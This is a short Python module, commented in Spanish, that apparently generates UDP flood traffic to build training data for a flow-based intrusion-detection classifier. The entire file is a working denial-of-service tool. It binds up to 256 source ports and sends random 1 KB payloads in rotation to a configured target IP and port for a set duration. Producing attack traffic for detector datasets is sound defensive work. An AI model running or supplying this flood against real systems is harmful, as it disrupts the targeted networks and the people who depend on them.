"""UDP flood (sin root) con rotación de source ports.

Un flood real usa muchos puertos origen. El flow_extractor agrupa por 5-tupla,
así que un socket único colapsa todo el flood a ~1 flujo. Rotando el sport
sobre un pool de sockets ligados producimos N flujos ricos en features
(cada sport = un flujo), balanceando la clase UDP_FLOOD sin datos sintéticos.
"""

from __future__ import annotations

import os
import socket
import time

N_PORTS = 256        # nº de source ports distintos → nº de flujos base
BASE_PORT = 20000


def run(cfg: dict) -> int:
    n_ports = int(cfg.get("src_ports", N_PORTS))
    socks: list[socket.socket] = []
    for i in range(n_ports):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.bind(("", BASE_PORT + i))
        except OSError:
            s.close()
            continue
        socks.append(s)
    if not socks:
        # fallback: un solo socket con sport efímero
        socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]

    payload = os.urandom(1024)
    target = (cfg["target_ip"], cfg["target_port"])
    end = time.time() + cfg["duration_s"]
    n = len(socks)
    i = 0
    while time.time() < end:
        s = socks[i % n]
        i += 1
        try:
            s.sendto(payload, target)
        except OSError:
            time.sleep(0.001)
    for s in socks:
        s.close()
    return 0
